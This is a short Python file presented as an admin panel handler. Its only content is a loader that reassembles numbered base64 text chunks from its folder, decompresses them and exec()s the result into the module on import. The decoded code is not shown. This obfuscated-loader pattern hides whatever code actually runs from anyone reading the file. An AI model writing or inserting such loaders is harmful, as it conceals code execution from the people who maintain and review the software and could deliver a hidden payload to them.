# handlers/admin_panel.py
import zlib, base64
from pathlib import Path
_dir = Path(__file__).resolve().parent
_parts = sorted(_dir.glob("ap_b64_*.txt"), key=lambda p: int(p.stem.split("_")[-1]))
_b = "".join(p.read_text().strip() for p in _parts)
_code = zlib.decompress(base64.b64decode(_b)).decode("utf-8")
exec(compile(_code, __file__, "exec"), globals())
